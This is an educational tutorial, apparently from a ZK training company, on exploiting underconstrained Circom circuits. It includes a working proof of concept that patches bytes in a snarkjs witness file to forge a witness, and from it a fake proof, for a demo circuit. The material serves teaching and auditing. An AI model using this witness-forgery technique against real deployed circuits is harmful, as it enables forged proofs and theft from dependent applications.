# Hacking Underconstrained Circom Circuits With Fake Proofs

The `<--` operator in Circom can be dangerous because it assigns values to signals but does not constrain them. But how do you actually ~~exploit~~ write a POC (proof of concept) for this vulnerability?

We will be hacking the following circuit:

```solidity
pragma circom 2.1.8;

template Mul3() {

    signal input a;
    signal input b;
    signal input c;

    signal output out;

    signal i;

    a * b === 1;   // Force a * b === 1
    i <-- a * b;   // i must be equal to 1
    out <== i * c; // out must equal c since i === 1
}

component main{public [a, b, c]} = Mul3();
```

Save this circuit as `mul3.circom` (short for multiply three variables).

The circuit seems to force the product of `a` and `b` to be 1, then assigns 1 to `i`.

Finally, `out` is constrained to be `i * c`. Since `i` supposedly can only have the value `1`, then `out` must equal `c`.

The bug here is that the `<--` is not creating a constraint but calculating a value and assigning it to `i`. In reality, `i` can be any value we want, it doesn't have to be `a * b` or `1`.

The exploit involves assigning a value to `i` that is not `a * b === 1`, allowing us to set `out ≠ c`.

To summarize, the circuit writer *expects* `out = c`, but we will violate this assumption. In the current example, no harm is done, but in a real application this could be a problem if it was critical two signals had the same value.

But how do we actually create the exploit?

## Steps to exploit

### Generating a valid proof

To create a proof for a Circom circuit, we first create an `input.json` for the circuit:

```json
{"a": "1", "b": "1", "c": "5"}
```

This will satisfy the circuit:

```javascript
a * b === 1;   // 1 * 1 === 1
i <-- a * b;   // 1 <-- 1 * 1
out <== i * c; // 5 <== 1 * 5;
// out === c as the dev expects
```

We compile the circuit to an r1cs using the following command:

```shell
circom mul3.circom --r1cs --wasm --sym
```

We then generate a witness with the wasm file it created, using `input.json` as the input:

```shell
cd mul3_js/
node generate_witness.js mul3.wasm ../input.json ../witness.wtns
cd ..
```

We can see the witness snarkjs computed for us with the following command:

```shell
snarkjs wtns export json witness.wtns witness.json
cat witness.json
```

![witness.json output](https://static.wixstatic.com/media/935a00_5747a762d4304c3989927f4a236adfc1~mv2.png/v1/fill/w_740,h_364,al_c,lg_1,q_85,enc_auto/935a00_5747a762d4304c3989927f4a236adfc1~mv2.png)

### Witness signal layout

The first entry in the witness vector is always `1`. (This was explained in our [r1cs article](https://www.rareskills.io/post/rank-1-constraint-system) which the reader can consult). The rest of the elements in the vector are the values in the circuit. We can see which element corresponds to which signal by viewing the `input.json`, `mul3.sym`, and the `witness.json` file:

```shell
cat input.json
cat mul3.sym
cat witness.json
```

We show the output and add the labels to the witness.json file below in <span style="color: #c1c146;">yellow</span>:

![witness signal labels](https://static.wixstatic.com/media/935a00_7d0345e1fc664c74a1d1d76f35550120~mv2.png/v1/fill/w_678,h_620,al_c,q_90,enc_auto/935a00_7d0345e1fc664c74a1d1d76f35550120~mv2.png)

To exploit this circuit, we want to assign a value to `i` that causes `out ≠ c`. However, Circom does not give us a mechanism to write directly to signals that are not input signals, and `i` is not an input signal (maybe to make our hack a little harder?). (snarkjs does provide a fullProve api which seems to do this, but this [code has been broken since 2021](https://github.com/iden3/snarkjs/issues/107)).

### Example malicious witness

One such malicious witness:

```javascript
[
    "1",
    "10", // out
    "1",   // a
    "1",   // b
    "5",   // c
    "2"    // i
]
```

This will satisfy the constraints:

```javascript
a * b === 1;   // 1 * 1 = 1
i <-- a * b;   // 2 <-- 1 * 1 is ok because <-- is not a constraint!
out <== i * c; // 10 = 2 * 5;
```

Right now, we have a valid witness which snarkjs will create a proof for:

```shell
snarkjs wtns check mul3.r1cs witness.wtns
```

![snarkjs witness check](https://static.wixstatic.com/media/935a00_7d37546c94a34d6d9f40c8e15fe81cdc~mv2.png/v1/fill/w_740,h_449,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/935a00_7d37546c94a34d6d9f40c8e15fe81cdc~mv2.png)

Our goal is to create a witness file that satisfies the circuit but violates the expected property that `out = c`.

## Understanding the layout of witness.wtns

The `witness.wtns` is a binary file. Unfortunately, as noted above, Circom and snarkjs do not provide an API to take a json witness vector and output a .wtns file. The format of the .wtns file can be determined by looking at the source [code that generates it](https://github.com/iden3/circom_runtime/blob/master/build/main.cjs#L533). However, a quick examination of the binary file is sufficient.

We see in the code linked above that it writes a `Uint8Array` to a file. So let's parse the file as a `Uint8Array` with the following code and print it out:

```javascript
const fs = require('fs');

const filePath = 'witness.wtns';

const data = fs.readFileSync(filePath);

let data_arr = new Uint8Array(data);
console.dir(data_arr, {'maxArrayLength': null});
```

![witness.wtns binary layout](https://static.wixstatic.com/media/935a00_24f0ffb3fec04d978f341cfc5159923f~mv2.png/v1/fill/w_740,h_554,al_c,q_90,usm_0.66_1.00_0.01,enc_auto/935a00_24f0ffb3fec04d978f341cfc5159923f~mv2.png)

Without going into the details of how this `witness.wtns` is formatted, we can still see the values of our witness laid out in the same order as the `witness.json`!

![witness binary values displayed](https://static.wixstatic.com/media/935a00_9f8d17fdab314b9ea83ae08963617e37~mv2.jpeg/v1/fill/w_740,h_395,al_c,q_80,usm_0.66_1.00_0.01,enc_auto/935a00_9f8d17fdab314b9ea83ae08963617e37~mv2.jpeg)

Now we are ready to create a fake witness by overwriting the binary file where the values for these signals `i` and `out` are stored:

```javascript
const fs = require('fs');

const filePath = 'witness.wtns';

const data = fs.readFileSync(filePath);
console.log("Before");
console.dir(data, {'maxArrayLength': null});

data[108] = 10; // `out`
data[236] = 2;  // `i`

console.log("After");
console.dir(data, {'maxArrayLength': null});

fs.writeFileSync('exploit_witness.wtns', data);
```

After running our code to create the fake witness, we can see the values corresponding to `out` and `i` have been altered as planned (the changed bytes are annotated with a <span style="color: Red;">red</span> box, the rest are unchanged):

![highlighting changed bytes in witness.wtns](https://static.wixstatic.com/media/935a00_06cc72c5a445454c9e71ff54bd543f68~mv2.png/v1/fill/w_740,h_1248,al_c,q_90,usm_0.66_1.00_0.01,enc_auto/935a00_06cc72c5a445454c9e71ff54bd543f68~mv2.png)

The code above also writes the file `exploit_witness.wtns` for us, which is simply the array of bytes printed above.

When we verify `exploit_witness.wtns` against the circuit using snarkjs:

```shell
snarkjs wtns check mul3.r1cs exploit_witness.wtns
```

![snarkjs wtns check](https://static.wixstatic.com/media/935a00_81192f33ba3b4f90bf53a623fafc2cae~mv2.png/v1/fill/w_740,h_384,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/935a00_81192f33ba3b4f90bf53a623fafc2cae~mv2.png)

The witness satisfies the circuit!

From here, we can simply follow the [proving steps in the Circom documentation](https://docs.circom.io/getting-started/proving-circuits/#verifying-from-a-smart-contract) to create a fake proof to exploit the circuit.

## Learn more with RareSkills

Please see our [Zero Knowledge Course](https://www.rareskills.io/zk-bootcamp) to learn more topics in ZK.

*Originally Published Mar 18*
